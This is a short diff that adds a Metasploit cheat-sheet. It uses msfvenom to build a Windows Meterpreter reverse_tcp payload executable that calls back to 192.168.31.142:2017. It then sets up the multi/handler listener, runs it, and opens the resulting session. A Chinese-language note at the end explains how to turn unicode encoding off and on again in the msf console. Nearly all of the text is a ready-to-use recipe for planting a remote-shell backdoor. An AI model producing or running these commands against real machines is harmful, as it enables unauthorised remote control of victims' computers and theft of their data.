@@ -1,0 +1,9 @@
+shell : msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.142 LPORT=2017 -f exe -o payload.exe
+msf > use exploit/multi/handler
+msf > set PAYLOAD windows/meterpreter/reverse_tcp
+msf > set LHOST 192.168.31.142
+msf > set LPORT 2017
+msf > exploit
+msf > sessions -i <id>
+msf中不能输入中文: disable_unicode_encoding
+             还原:enable_unicode_encoding
